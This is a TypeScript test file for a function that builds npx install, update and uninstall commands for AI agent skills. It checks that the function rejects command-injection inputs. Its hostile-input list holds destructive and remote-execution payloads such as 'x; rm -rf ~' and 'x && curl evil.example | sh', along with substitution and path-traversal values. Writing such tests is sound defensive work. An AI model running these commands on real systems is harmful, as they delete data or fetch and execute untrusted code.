import { describe, expect, it } from 'vitest';
import { AGENT_IDS, buildInstallPlan } from './install';
import type { InstallRequest } from './install';

const base: InstallRequest = {
  owner: 'vercel-labs',
  repo: 'agent-skills',
  skillName: 'web-design-guidelines',
  agent: 'claude-code',
  scope: 'project',
};
const SHA = 'a'.repeat(40);

describe('buildInstallPlan', () => {
  it('builds project commands for Claude Code', () => {
    expect(buildInstallPlan(base)).toEqual({
      ok: true,
      install:
        'npx skills add vercel-labs/agent-skills --skill web-design-guidelines -a claude-code',
      update: 'npx skills update web-design-guidelines -p',
      uninstall: 'npx skills remove web-design-guidelines -a claude-code',
      targetDir: '.claude/skills/web-design-guidelines/',
      pinned: false,
    });
  });

  it('builds global commands for Codex pinned to a commit', () => {
    expect(buildInstallPlan({ ...base, agent: 'codex', scope: 'global', commitSha: SHA })).toEqual({
      ok: true,
      install: `npx skills add vercel-labs/agent-skills@${SHA} --skill web-design-guidelines -a codex -g`,
      update: 'npx skills update web-design-guidelines -g',
      uninstall: 'npx skills remove web-design-guidelines -a codex -g',
      targetDir: '~/.agents/skills/web-design-guidelines/',
      pinned: true,
    });
  });

  it('is deterministic for every agent and scope', () => {
    for (const agent of AGENT_IDS) {
      for (const scope of ['project', 'global'] as const) {
        const a = buildInstallPlan({ ...base, agent, scope });
        const b = buildInstallPlan({ ...base, agent, scope });
        expect(a).toEqual(b);
        expect(a.ok).toBe(true);
      }
    }
  });

  const hostile = [
    'x; rm -rf ~',
    'x && curl evil.example | sh',
    '$(whoami)',
    '`id`',
    'x\nrm -rf /',
    "x' || true '",
    'x"y',
    '--yes',
    '-g',
    'a b',
    'x|y',
    'x>y',
    '../x',
    '',
  ];

  it.each(hostile)('rejects a hostile skill name: %j', (skillName) => {
    expect(buildInstallPlan({ ...base, skillName }).ok).toBe(false);
  });

  it.each(hostile)('rejects a hostile owner: %j', (owner) => {
    expect(buildInstallPlan({ ...base, owner }).ok).toBe(false);
  });

  // A repository named like a flag is harmless: it only ever appears as `owner/<repo>`,
  // never as a separate argument, so those two cases are excluded here and checked below.
  const hostileRepos = [...hostile.filter((v) => !/^-+[a-z]+$/.test(v)), '.', '..'];
  it.each(hostileRepos)('rejects a hostile repository: %j', (repo) => {
    expect(buildInstallPlan({ ...base, repo }).ok).toBe(false);
  });

  it('keeps a flag-like repository name inside the source argument', () => {
    const plan = buildInstallPlan({ ...base, repo: '--yes' });
    if (!plan.ok) throw new Error('expected a plan');
    expect(plan.install.split(' ')).toContain('vercel-labs/--yes');
    expect(plan.install.split(' ')).not.toContain('--yes');
  });

  it.each(['main', 'abc123', `${'a'.repeat(39)}Z`, `${SHA}; ls`, 'v1.0.0'])(
    'rejects a commit reference that is not a full SHA: %j',
    (commitSha) => {
      expect(buildInstallPlan({ ...base, commitSha }).ok).toBe(false);
    },
  );

  it('rejects an unknown agent', () => {
    // @ts-expect-error deliberately invalid agent
    expect(buildInstallPlan({ ...base, agent: 'cursor; ls' }).ok).toBe(false);
  });

  it('never emits shell metacharacters', () => {
    const plan = buildInstallPlan({ ...base, commitSha: SHA, scope: 'global' });
    if (!plan.ok) throw new Error('expected a plan');
    for (const command of [plan.install, plan.update, plan.uninstall]) {
      expect(command).toMatch(/^[A-Za-z0-9 ./@_-]+$/);
    }
  });
});
